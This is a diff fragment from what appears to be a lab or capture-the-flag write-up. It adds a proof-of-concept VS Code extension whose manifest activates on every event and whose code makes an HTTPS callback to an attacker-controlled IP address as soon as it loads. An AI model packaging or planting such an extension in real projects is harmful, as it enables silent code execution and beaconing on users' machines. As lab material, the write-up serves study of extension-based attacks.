@@ -505,6 +505,58 @@ found 0 vulnerabilities
 
 ```
 
+``` json
+
+{
+  "name": "checkpoint-test",
+  "displayName": "Checkpoint Test",
+  "version": "1.0.0",
+  "engines": {
+    "vscode": "^1.118.0"
+  },
+  "activationEvents": [
+    "*"
+  ],
+  "main": "./extension.js"
+}
+
+```
+
+``` js
+
+const vscode = require("vscode");
+const https = require("https");
+
+function activate(context) {
+    const options = {
+        hostname: "10.10.15.166",
+        port: 8000,
+        path: "/checkpoint-vsix",
+        method: "GET"
+    };
+
+    const req = https.request(options, (res) => {
+        console.log(`PoC callback: HTTP ${res.statusCode}`);
+    });
+
+    req.on("error", (err) => {
+        console.error(`PoC callback failed: ${err.message}`);
+    });
+
+    req.end();
+
+    vscode.window.showInformationMessage("Checkpoint VSIX activated");
+}
+
+function deactivate() {}
+
+module.exports = {
+    activate,
+    deactivate
+};
+
+```
+
 ``` bash
 
 ❯ ls
